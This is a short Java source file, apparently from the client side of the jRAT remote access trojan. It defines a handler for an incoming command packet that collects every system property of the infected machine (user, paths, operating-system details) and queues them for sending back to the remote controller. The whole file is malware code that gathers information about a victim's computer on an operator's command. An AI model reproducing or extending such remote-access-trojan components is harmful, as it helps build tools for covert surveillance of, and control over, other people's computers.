package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet32SystemProperties;

import java.util.Set;


public class Packet90SystemProperties implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Set<Object> set = System.getProperties().keySet();
		for (Object str : set) {
			con.addToSendQueue(new Packet32SystemProperties(str.toString(), System.getProperty(str.toString())));
		}
	}

}
